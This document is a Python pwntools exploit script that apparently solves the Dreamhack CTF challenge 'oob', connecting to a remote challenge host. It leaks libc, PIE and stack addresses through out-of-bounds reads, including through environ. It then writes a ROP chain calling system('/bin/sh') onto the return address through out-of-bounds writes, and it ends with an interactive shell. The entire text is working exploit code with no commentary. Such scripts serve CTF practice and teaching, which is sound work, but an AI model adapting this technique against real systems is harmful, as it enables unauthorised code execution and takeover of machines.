#!/usr/bin/env python3

from pwn import *

exe = ELF("./oob_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process()
p = remote('host3.dreamhack.games', 10781)
#gdb.attach(p,gdbscript='''
#           brva 0x000000000000135C
#           brva 0x000000000000139A
#           brva 0x00000000000013DB
#           ''')

leak_libc = b''
for i in range(16,22):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'offset: ',str(i).encode())
    leak_libc += p.recv(1)
leak_libc = u64(leak_libc.ljust(8,b'\x00'))
print(hex(leak_libc))
libc.address = leak_libc - libc.sym._IO_2_1_stdout_
log.success(f"libc: {hex(libc.address)}")


offset = 0x4008

leak_PIE = b''
for i in range(-8,-2,1):

    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'offset: ',str(i).encode())
    leak_PIE += p.recv(1)


leak_PIE = u64(leak_PIE.ljust(8,b'\x00'))

exe.address = leak_PIE - offset
log.success(f"exe address: {hex(exe.address)}")

###############################################
environ = libc.sym.environ
log.info(f"environ: {hex(environ)}")
oob = exe.address + 0x4010 

environ2oob = environ - oob
stack_leak = b""
input()
for i in range(environ2oob,environ2oob+8):
    p.sendlineafter(b"> ",b'1')
    p.sendlineafter(b"offset: ",str(i).encode())
    stack_leak += p.recv(1)
stack_leak = u64(stack_leak)

log.info(f"stack leak: {hex(stack_leak)}" )

rsp = stack_leak - 0x120

oob2ret = rsp - oob
bin_sh = next(libc.search('/bin/sh\x00'))
system = libc.sym.system
pop_rdi = 0x000000000002a3e5 + libc.address
one_gadget = 0xebcf5 + libc.address
log.info(f"rsp = {hex(rsp)}")
log.info(f"environ: {hex(stack_leak)}")
log.info(f"og: {hex(one_gadget)}")
input()
p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'offset: ',str(oob2ret).encode())
p.sendlineafter(b'value: ',str(pop_rdi).encode())

p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'offset: ',str(oob2ret+8).encode())
p.sendlineafter(b'value: ',str(bin_sh).encode())

p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'offset: ',str(oob2ret+16).encode())
p.sendlineafter(b'value: ',str(pop_rdi+1).encode())

p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'offset: ',str(oob2ret+24).encode())
p.sendlineafter(b'value: ',str(system).encode())



p.interactive()
